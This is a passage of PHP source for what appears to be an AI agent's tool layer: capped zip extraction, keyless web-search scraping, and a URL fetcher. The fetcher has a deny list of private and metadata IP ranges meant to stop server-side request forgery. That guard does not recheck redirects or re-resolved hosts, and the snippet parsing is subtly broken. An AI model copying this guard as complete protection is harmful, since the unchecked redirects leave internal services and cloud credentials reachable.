            if ($zip->open($zipPath) !== true) {
                throw new \RuntimeException("unzip: cannot open $zipPath");
            }
            if ($zip->numFiles > 5000) {
                $zip->close();
                throw new \RuntimeException('unzip: archive has too many entries (limit 5000)');
            }
            $total = 0;
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $stat = $zip->statIndex($i);
                if ($stat === false) { continue; }
                $name = (string)$stat['name'];
                if ($name === '' || substr($name, -1) === '/') {
                    $target = self::zipTarget($destFull, $name);
                    if (!is_dir($target) && !@mkdir($target, 0775, true) && !is_dir($target)) {
                        $zip->close();
                        throw new \RuntimeException("unzip: cannot create directory $target");
                    }
                    continue;
                }
                $total += (int)$stat['size'];
                if ($total > 200 * 1024 * 1024) {
                    $zip->close();
                    throw new \RuntimeException('unzip: uncompressed data exceeds the 200 MB limit');
                }
                $target = self::zipTarget($destFull, $name);
                $parent = dirname($target);
                if (!is_dir($parent) && !@mkdir($parent, 0775, true) && !is_dir($parent)) {
                    $zip->close();
                    throw new \RuntimeException("unzip: cannot create directory $parent");
                }
                $data = $zip->getFromIndex($i);
                if ($data === false || @file_put_contents($target, $data) === false) {
                    $zip->close();
                    throw new \RuntimeException("unzip: cannot extract $name");
                }
                $count++;
            }
            $zip->close();
        } elseif (class_exists('PharData')) {
            try {
                $phar = new \PharData($zipPath);
                $prefix = 'phar://' . str_replace('\\', '/', $zipPath) . '/';
                $total = 0;
                $seen = 0;
                $it = new \RecursiveIteratorIterator($phar, \RecursiveIteratorIterator::SELF_FIRST);
                foreach ($it as $file) {
                    $seen++;
                    if ($seen > 5000) { throw new \RuntimeException('unzip: too many entries (limit 5000)'); }
                    $name = str_replace('\\', '/', $file->getPathname());
                    if (strpos($name, $prefix) === 0) { $name = substr($name, strlen($prefix)); }
                    self::zipTarget($destFull, $name);
                    if (!$file->isDir()) { $total += $file->getSize(); }
                    if ($total > 200 * 1024 * 1024) {
                        throw new \RuntimeException('unzip: uncompressed data exceeds the 200 MB limit');
                    }
                }
                $phar->extractTo($destFull, null, true);
                $count = $seen;
            } catch (\Throwable $e) {
                throw new \RuntimeException('unzip: ' . $e->getMessage());
            }
        } else {
            throw new \RuntimeException('unzip: this PHP has neither ZipArchive nor PharData');
        }

        return ['path' => $destFull, 'extracted' => $count];
    }

    // ---------------------------------------------------------------
    // Internet
    // ---------------------------------------------------------------

    /**
     * Keyless web search, with fallbacks.
     *
     * DuckDuckGo's HTML endpoints are scraped first because they need no API
     * key, but they answer self-hosted installs with a bot challenge more often
     * than not -- DDG blocks datacentre IP ranges, which is where a home server
     * or VPS lives. So two further keyless engines are tried in turn, and the
     * response reports which one answered.
     *
     * For a dependable setup, set search_engine to "searxng" and search_url to
     * your own instance ("https://searx.example.com/search"); it returns clean
     * JSON and cannot be blocked this way.
     */
    public static function webSearch($query, $limit = 8) {
        $query = trim((string)$query);
        if ($query === '') { throw new \RuntimeException('web_search: empty query'); }
        $limit = max(1, min(20, (int)$limit));
        $c = self::config();

        if ($c['search_engine'] === 'searxng' && $c['search_url'] !== '') {
            return self::searxngSearch($c['search_url'], $query, $limit);
        }
        if ($c['search_engine'] === 'ddg') {
            // Encoders differ and it matters: Wiby and Marginalia match only on
            // "+"-encoded queries, while rawurlencode's %20 returns an empty
            // page from both. So the encoding is part of each engine's spec.
            return self::engineChain($query, $limit, [
                ['duckduckgo', 'https://html.duckduckgo.com/html/?q=', 'rawurlencode', [self::class, 'parseDuckHtml']],
                ['duckduckgo', 'https://lite.duckduckgo.com/lite/?q=', 'rawurlencode', [self::class, 'parseDuckLite']],
                ['marginalia', 'https://old-search.marginalia.nu/search?query=', 'urlencode', [self::class, 'parseMarginalia']],
                ['wiby',       'https://wiby.me/?q=', 'urlencode', [self::class, 'parseAnchorList']],
            ]);
        }
        throw new \RuntimeException(
            'web_search: unknown engine "' . $c['search_engine'] . '". Use "ddg" or "searxng".'
        );
    }

    /**
     * Try each engine in order and return the first that yields results.
     *
     * Keyless scraping endpoints fail for reasons outside our control --
     * DuckDuckGo in particular serves a "confirm you are human" page to
     * datacentre IP ranges, which is where most self-hosted installs live.
     * Trying several and falling through means search keeps working instead of
     * returning one hard failure. Errors from every attempt are reported
     * together so a genuine outage is still diagnosable.
     */
    private static function engineChain($query, $limit, $engines) {
        $errors = [];
        foreach ($engines as list($name, $base, $encoder, $parser)) {
            $url = $base . ($encoder === 'urlencode' ? urlencode($query) : rawurlencode($query));
            $res = self::httpGet($url, self::USER_AGENT);
            if (isset($res['error'])) { $errors[] = "$name: {$res['error']}"; continue; }
            $parsed = call_user_func($parser, $res['body']);
            if ($parsed) {
                return [
                    'query' => $query,
                    'engine' => $name,
                    'results' => array_slice($parsed, 0, $limit),
                ];
            }
            $errors[] = "$name: no results in response";
        }
        throw new \RuntimeException(
            'web_search: every engine failed (' . implode('; ', $errors) . '). '
            . 'If this persists, set search_engine to "searxng" in storage/config.json and point '
            . 'search_url at your own SearXNG instance.'
        );
    }

    /**
     * Generic anchor scraper for the simpler engines (wiby, Marginalia).
     * Takes anchors pointing at absolute http(s) URLs, using the anchor text
     * as the title. Good enough for a result list; the dedicated parsers above
     * exist because DuckDuckGo wraps every link in a redirect.
     */
    /**
     * Marginalia result cards. Each <section class="card search-result">
     * carries a url div, an h2 title link, and a description paragraph.
     * Deliberately structure-based: the generic anchor scraper would return
     * Marginalia's own navigation instead.
     */
    private static function parseMarginalia($html) {
        if (!preg_match_all(
            '#<section[^>]*class="[^"]*search-result[^"]*"[^>]*>(.*?)</section>#is',
            $html, $cards, PREG_SET_ORDER
        )) {
            return [];
        }
        $out = [];
        foreach ($cards as $card) {
            $body = $card[1];
            if (!preg_match('#class="title"[^>]*href="([^"]+)"[^>]*>(.*?)</a>#is', $body, $t)) { continue; }
            $url = html_entity_decode($t[1], ENT_QUOTES, 'UTF-8');
            $title = trim(html_entity_decode(strip_tags($t[2]), ENT_QUOTES, 'UTF-8'));
            $snippet = '';
            if (preg_match('#class="description"[^>]*>(.*?)</p>#is', $body, $d)) {
                $snippet = trim(html_entity_decode(strip_tags($d[1]), ENT_QUOTES, 'UTF-8'));
            }
            $out[] = ['title' => self::clip($title, 200), 'url' => $url, 'snippet' => self::clip($snippet, 400)];
        }
        return $out;
    }

    private static function parseAnchorList($html) {
        if (!preg_match_all('#<a[^>]+href="(https?://[^"]+)"[^>]*>(.*?)</a>#is', $html, $m, PREG_SET_ORDER)) {
            return [];
        }
        $out = [];
        $seen = [];
        foreach ($m as $hit) {
            $url = html_entity_decode($hit[1], ENT_QUOTES, 'UTF-8');
            $title = trim(html_entity_decode(strip_tags($hit[2]), ENT_QUOTES, 'UTF-8'));
            // Skip the site's own chrome: nav, license, contact.
            if ($title === '' || isset($seen[$url])) { continue; }
            if (preg_match('#^(https?://)(www\.)?(wiby\.me|marginalia\.nu|creativecommons\.org|ip2location\.com)#i', $url)) {
                continue;
            }
            $seen[$url] = true;
            $out[] = ['title' => self::clip($title, 200), 'url' => $url, 'snippet' => ''];
        }
        return $out;
    }

    private static function parseDuckHtml($html) {
        $out = [];
        // Each result is a link plus a snippet; pull the pairs out in one pass.
        if (preg_match_all('#<a[^>]+class="[^"]*result__a[^"]*"[^>]+href="([^"]+)"[^>]*>(.*?)</a>#is', $html, $m, PREG_SET_ORDER)) {
            foreach ($m as $hit) {
                $url = self::unwrapDuckUrl(html_entity_decode($hit[1], ENT_QUOTES, 'UTF-8'));
                $title = trim(html_entity_decode(strip_tags($hit[2]), ENT_QUOTES, 'UTF-8'));
                if ($url === '' || $title === '') { continue; }
                $snippet = '';
                if (preg_match('#result__snippet[^>]*>(.*?)</a>#is', $html, $s)
                    && preg_match_all('#result__a[^>]*>.*?</a>(.*?)#is', $html, $snips)) {
                    // Snippet order matches link order; take by position.
                    $idx = array_search($hit, $m, true);
                    $snippet = isset($snips[1][$idx]) ? trim(strip_tags($snips[1][$idx])) : '';
                }
                $out[] = ['title' => self::clip($title, 200), 'url' => $url, 'snippet' => self::clip($snippet, 400)];
            }
        }
        return $out;
    }

    private static function parseDuckLite($html) {
        $out = [];
        if (preg_match_all('#<a[^>]+class="[^"]*result-link[^"]*"[^>]+href="([^"]+)"[^>]*>(.*?)</a>#is', $html, $m, PREG_SET_ORDER)) {
            foreach ($m as $hit) {
                $url = self::unwrapDuckUrl(html_entity_decode($hit[1], ENT_QUOTES, 'UTF-8'));
                $title = trim(html_entity_decode(strip_tags($hit[2]), ENT_QUOTES, 'UTF-8'));
                if ($url === '' || $title === '') { continue; }
                $out[] = ['title' => self::clip($title, 200), 'url' => $url, 'snippet' => ''];
            }
        }
        return $out;
    }

    /** DuckDuckGo wraps results as /l/?uddg=<urlencoded real url>. */
    private static function unwrapDuckUrl($url) {
        if (preg_match('/[?&]uddg=([^&]+)/', $url, $m)) {
            return urldecode($m[1]);
        }
        return $url;
    }

    private static function searxngSearch($base, $query, $limit) {
        $url = rtrim($base, '/') . '/search?q=' . rawurlencode($query) . '&format=json&safesearch=1';
        $res = self::httpGet($url, self::USER_AGENT);
        if (isset($res['error'])) { throw new \RuntimeException('web_search: ' . $res['error']); }
        $data = json_decode($res['body'], true);
        if (!is_array($data) || !isset($data['results'])) {
            throw new \RuntimeException('web_search: SearXNG did not return JSON (is format=json enabled?)');
        }
        $out = [];
        foreach ($data['results'] as $r) {
            $out[] = [
                'title' => self::clip((string)($r['title'] ?? ''), 200),
                'url' => (string)($r['url'] ?? ''),
                'snippet' => self::clip((string)($r['content'] ?? ''), 400),
            ];
            if (count($out) >= $limit) { break; }
        }
        return ['query' => $query, 'engine' => 'searxng', 'results' => $out];
    }

    /**
     * Fetch a URL and reduce it to text. Runs server-side so CORS-protected
     * pages work, and refuses to talk to the local network.
     */
    public static function fetchUrl($url, $maxChars = 20000) {
        $url = trim((string)$url);
        if ($url === '') { throw new \RuntimeException('fetch_url: empty url'); }
        if (!preg_match('~^https?://~i', $url)) { $url = 'https://' . $url; }
        self::assertPublicUrl($url);

        $maxChars = max(500, min(120000, (int)$maxChars));
        $res = self::httpGet($url, self::USER_AGENT, self::MAX_FETCH_BYTES);
        if (isset($res['error'])) { throw new \RuntimeException('fetch_url: ' . $res['error']); }

        $ctype = strtolower($res['content_type']);
        if (strpos($ctype, 'json') !== false) {
            $body = self::clip($res['body'], $maxChars);
            return ['url' => $url, 'status' => $res['status'], 'type' => 'json', 'text' => $body];
        }
        if (strpos($ctype, 'pdf') !== false) {
            // No PDF parser here; say so plainly instead of returning mojibake.
            throw new \RuntimeException('fetch_url: PDF support not built in — fetch the HTML page instead');
        }
        $text = self::htmlToText($res['body']);
        return [
            'url' => $url,
            'status' => $res['status'],
            'type' => 'html',
            'title' => self::clip(self::extractTitle($res['body']), 200),
            'text' => self::clip($text, $maxChars),
            'truncated' => strlen($text) > $maxChars,
        ];
    }

    /**
     * Block requests to the server's own network. An agent with a fetch tool
     * would otherwise be able to read cloud metadata endpoints or whatever else
     * is listening on localhost.
     */
    private static function assertPublicUrl($url) {
        $parts = parse_url($url);
        $host = $parts['host'] ?? '';
        if ($host === '') { throw new \RuntimeException('fetch_url: could not parse a host from that url'); }

        $host = preg_replace('/^\[|\]$/', '', $host);
        if (filter_var($host, FILTER_VALIDATE_IP)) {
            $ip = $host;
        } else {
            $ip = gethostbyname($host);
            if ($ip === $host) { throw new \RuntimeException("fetch_url: cannot resolve host $host"); }
        }
        if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
            throw new \RuntimeException('fetch_url: only IPv4 destinations are supported here');
        }
        $long = ip2long($ip);
        $blocked = [
            ['10.0.0.0', 8], ['172.16.0.0', 12], ['192.168.0.0', 16],
            ['127.0.0.0', 8], ['169.254.0.0', 16], ['0.0.0.0', 8],
            ['100.64.0.0', 10],
        ];
        foreach ($blocked as list($net, $bits)) {
            $mask = -1 << (32 - $bits);
            if (($long & $mask) === (ip2long($net) & $mask)) {
                throw new \RuntimeException('fetch_url: refusing to fetch a private or local address');
            }
        }
    }

    /**
     * The proxy outbound agent traffic should use, or '' for a direct call.
     *
     * Read from the same config.json entry the model relay uses, so "route
     * everything through this proxy" really does mean everything. The relay was
     * routed but the tools were not, so an agent asking for its own IP through
     * web_search, fetch_url or `exec curl` was going out direct while its model
     * calls went through the proxy -- which looks exactly like the proxy not
     * working at all.
     */
    public static function activeProxy() {
        try {
            $cfg = self::config();
            return trim((string)($cfg['proxy_active'] ?? ''));
        } catch (\Throwable $e) {
            return '';
        }
    }

    /** Minimal curl GET. Returns ['status','body','content_type'] or ['error']. */
    private static function httpGet($url, $ua, $maxBytes = self::MAX_FETCH_BYTES) {
        $ch = curl_init($url);
        $activeProxy = self::activeProxy();
        if ($activeProxy !== '') {
            curl_setopt($ch, CURLOPT_PROXY, $activeProxy);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        }
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_TIMEOUT        => 25,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_USERAGENT      => $ua,
            CURLOPT_HTTPHEADER     => ['Accept-Language: en-US,en;q=0.9'],
            CURLOPT_ENCODING       => '',
        ]);
        // Cap the download without a write callback: setting CURLOPT_WRITEFUNCTION
        // overrides RETURNTRANSFER, so curl_exec would hand back TRUE instead
        // of the body. CURLOPT_PROGRESSFUNCTION lets us abort from the
        // transfer layer while the body still arrives as a string.
        $seen = 0;
        curl_setopt($ch, CURLOPT_NOPROGRESS, false);
        curl_setopt($ch, CURLOPT_PROGRESSFUNCTION, function ($c, $dls, $dlnow, $dlto) use ($maxBytes, &$seen) {
            $seen = $dlnow;
            // Non-zero aborts the transfer.
            return $dlnow > $maxBytes ? 1 : 0;
        });

        $body = curl_exec($ch);
        $err = curl_error($ch);
        $status = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $ctype = (string)curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
        curl_close($ch);

        if ($body === false) { return ['error' => $err !== '' ? $err : 'request failed']; }
        if ($status >= 400) { return ['error' => "HTTP $status"]; }
        $truncated = $seen > $maxBytes;
        if ($truncated) { $body = substr($body, 0, $maxBytes); }
        return [
            'status' => $status,
            'body' => $body,
            'content_type' => $ctype,
            'truncated' => $truncated,
        ];
    }

    // ---------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------

    /**
     * Make a model-supplied pattern usable by preg_match.
     *
     * PCRE needs delimiters, but a model is just as likely to send a bare
     * "function\s+\w+" as a delimited "/function\s+\w+/i". So: if the pattern
     * already parses, use it unchanged (preserving any flags). Otherwise wrap
     * it in a delimiter that does not occur inside it. Regex metacharacters
     * survive either way -- only the delimiters are supplied.
     *
     * @throws \RuntimeException when the pattern is not valid either way
     */
    private static function asRegex($pattern) {
        if (@preg_match($pattern, '') !== false) { return $pattern; }
        foreach (['/', '#', '~', '%', '!', '@'] as $delim) {
            if (strpos($pattern, $delim) !== false) { continue; }
            $candidate = $delim . $pattern . $delim . 'u';
            if (@preg_match($candidate, '') !== false) { return $candidate; }
            $candidate = $delim . $pattern . $delim;
            if (@preg_match($candidate, '') !== false) { return $candidate; }
        }
        throw new \RuntimeException(
            'grep: not a valid regular expression. Use a bare pattern like '
            . 'function\\s+\\w+, or a delimited one like /function\\s+\\w+/i'
        );
    }

    private static function within($path, $roots) {
        foreach ($roots as $root) {
            if (strpos($path, $root . '/') === 0 || $path === $root) { return true; }
        }
        return false;
    }

    /**
     * Filename match, with brace expansion.
     *
     * The default glob is "*.{php,js,css,...}", and fnmatch() does not
     * understand braces -- it would silently match nothing, which is how a
     * grep tool can look broken. Expand the braces with glob() once and cache
     * the resulting pattern list.
     */
    private static function matchesAny($pattern, $name) {
        static $cache = [];
        if (!isset($cache[$pattern])) {
            // Expand braces by hand. glob() cannot do this job: it matches
            // paths on disk, so a pattern like "*.{php,js}" would be resolved
            // against the current working directory and usually match nothing.
            $cache[$pattern] = self::expandBraces($pattern);
        }
        foreach ($cache[$pattern] as $p) {
            if (fnmatch($p, $name)) { return true; }
        }
        return false;
    }

    /** "*.{php,js}" => ["*.php", "*.js"]. Non-nested; enough for a glob. */
    private static function expandBraces($pattern) {
        $open = strpos($pattern, '{');
        if ($open === false) { return [$pattern]; }
        $close = strpos($pattern, '}', $open);
        if ($close === false) { return [$pattern]; }

        $pre = substr($pattern, 0, $open);
        $post = substr($pattern, $close + 1);
        $out = [];
        foreach (explode(',', substr($pattern, $open + 1, $close - $open - 1)) as $alt) {
            foreach (self::expandBraces($pre . $alt . $post) as $expanded) {
                $out[] = $expanded;
            }
        }
        return $out;
    }

    private static function anySegment($rel, $segments) {
        foreach (explode('/', $rel) as $seg) {
            if (in_array($seg, $segments, true)) { return true; }
        }
        return false;
    }

    private static function number($lines, $start) {
        $out = [];
        $pad = strlen((string)($start + count($lines) - 1));
        foreach ($lines as $i => $line) {
            $out[] = str_pad((string)($start + $i), $pad, ' ', STR_PAD_LEFT) . '  ' . $line;
        }
        return $out;
    }

    /** Hard cap on any text handed back to a model, with a visible marker. */
    private static function clip($text, $limit = 60000) {
        $text = (string)$text;
        if (strlen($text) <= $limit) { return $text; }
        return substr($text, 0, $limit)
            . "\n\n[... truncated at $limit characters. Narrow your query, or read a file by line range.]";
    }

    private static function extractTitle($html) {
        return preg_match('~<title[^>]*>(.*?)</title>~is', $html, $m)
            ? trim(html_entity_decode(strip_tags($m[1]), ENT_QUOTES, 'UTF-8'))
            : '';
    }

    /** Reduce an HTML document to readable text, keeping block structure. */
    private static function htmlToText($html) {
        $s = preg_replace('#<(script|style|noscript|svg|head)\b[^>]*>.*?</\1>#is', ' ', $html);
        $s = preg_replace('#<!--.*?-->#s', ' ', (string)$s);
        $s = preg_replace('#<(br|/p|/div|/li|/tr|/h[1-6]|/pre)\b[^>]*>#i', "\n", (string)$s);
        $s = strip_tags((string)$s);
        $s = html_entity_decode($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');
        $s = preg_replace("/[ \t]+\n/", "\n", $s);
        $s = preg_replace("/\n{3,}/", "\n\n", (string)$s);
        return trim((string)$s);
    }
}